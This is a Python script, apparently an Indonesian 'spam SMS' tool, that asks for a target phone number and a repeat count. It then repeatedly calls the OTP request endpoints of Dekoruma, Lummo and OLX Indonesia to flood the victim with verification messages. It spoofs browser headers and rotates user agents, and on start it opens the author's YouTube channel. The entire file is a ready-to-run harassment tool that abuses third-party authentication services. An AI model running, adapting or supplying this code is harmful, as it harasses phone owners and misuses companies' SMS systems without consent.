try:
    import os,sys,time,requests,json,random
    from colorama import Fore,Back,init
except ModuleNotFoundError:
    print(f"{W}[{R}!{W}] Module Tidak Tersedia{abu}...")
    time.sleep(5)
    print(f"{W}[{R}!{W}] Type{R}:{Y}pip{W} install colorama requests")

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW
Hijau="\033[1;92m"
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="33[37;1m"
biru="\033[1;96m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mText\033[1;0m"

def mr_wibu():
    mr_tytyd = input(f"{W}Replay? {biru}({W}y{Y}/{W}n{biru}){R}:{G} ")
    if mr_tytyd=="y" or mr_tytyd=="Y":
        time.sleep(5)
        put()
    if mr_tytyd=="n" or mr_tytyd=="N":
        sys.exit(f"{W}[{R}!{W}] Exited With Program{abu}....{W}")
        time.sleep(5)

def logo_taekyung():
    try:
        mr_ip=requests.get('https://api.ipify.org').text
        mr_time=time.asctime(time.localtime(time.time()))
        os.system("clear")
        print (f"{biru}Subscribe Channel {W}Aing Dulu {biru}Sluur !!!!")
        os.system("xdg-open https://youtube.com/channel/UCFeZ5BGt8lbOZwIj2MNOlIQ")
        time.sleep(5)
        os.system("clear")
        print(f"""
{biru}╔═╗{W}┌┬┐┌─┐    {ungu}╦ ╦{W}┌┐┌┬  ┬ {abu}| {B}»{Y}⟩{W} Creator {R}:{W} AmmarBN {biru}ft {W}Powerr-python
{biru}╚═╗{W}│││└─┐ ── {ungu}║ ║{W}││││  │ {abu}| {B}»{Y}⟩{W} Github {R}: \033[4;92mgithub.com/AmmarrBN\033[1;0m
{biru}╚═╝{W}┴ ┴└─┘    {ungu}╚═╝{W}┘└┘┴─┘┴ {abu}| {B}»{Y}⟩{W} Team {R}:{G} Executed_Team
{W}[{Y}•{W}] Ip Info {R}:{G} {mr_ip}
{W}[{Y}•{W}] Info Waktu {W}:{G} {mr_time}
""")
    except requests.exceptions.ConnectionError:
        sys.exit(f"{W}[{R}!{W}] Koneksi Eror Silakan Cek Jaringan Anda{abu}....{abu}")
    except KeyboardInterrupt:
        sys.exit(f"{W}[{R}!{W}] Exited With Program{abu}...{W}")
        

def put():
    logo_taekyung()
    try:
        mr_ua=random.choice(["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646","Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"])
        mr_ip=requests.get('https://api.ipify.org').text
        mr_ammar=input(f"{W}[{biru}?{W}] Target Number {biru}(Ex{R}:{W}8xx{biru}) {R}»{Y}⟩{W} ")
        power_python=int(input(f"{W}[{biru}?{W}] Total Spam {R}»{Y}⟩{W} "))
        print ("")
        for i in range(int(power_python)):
            time.sleep(8)
            dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+mr_ammar,"platform":"sms"})).text
            if "ok" in dekor2:
                print (f"{W}[{G}✓{W}] Sukses Sending Spam To {Y}{mr_ammar}")
            else:
                print (f"{W}[{R}×{W}] Gagal Sending Spam To {Y}{mr_ammar}")
            time.sleep(8)
            lummo={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
            gas=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+mr_ammar,"hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})
            gaskeun=requests.post("https://api.tokko.io/graphql",headers=lummo,data=gas).text
            if "erors" in gaskeun:
                print (f"{W}[{R}×{W}] Gagal Sending Spam To {Y}{mr_ammar}")
            else:
                print (f"{W}[{G}✓{W}] Sukses Sending Spam To {Y}{mr_ammar}")
            time.sleep(8)
            AmmarGamteng=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+mr_ammar,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": mr_ua,"content-type": "application/json"}).text
            if "PENDING" in AmmarGamteng:
                print (f"{W}[{G}✓{W}] Sukses Sending Spam To {Y}{mr_ammar}")
            else:
                print (f"{W}[{R}×{W}] Gagal Sending Spam To {Y}{mr_ammar}{W}")
        mr_wibu()
    except requests.exceptions.ConnectionError:
        sys.exit(f"{W}[{R}!{W}] Koneksi Eror Silakan Cek Jaringan Anda{abu}....{abu}")
    except KeyboardInterrupt:
        sys.exit(f"{W}[{R}!{W}] Exited With Program{abu}...{W}")
    except ValueError:
        sys.exit(f"{W}[{Y}!{W}] Masukkan Dengan Benar Kak{abu}.....")
        

if __name__=='__main__':
    put()
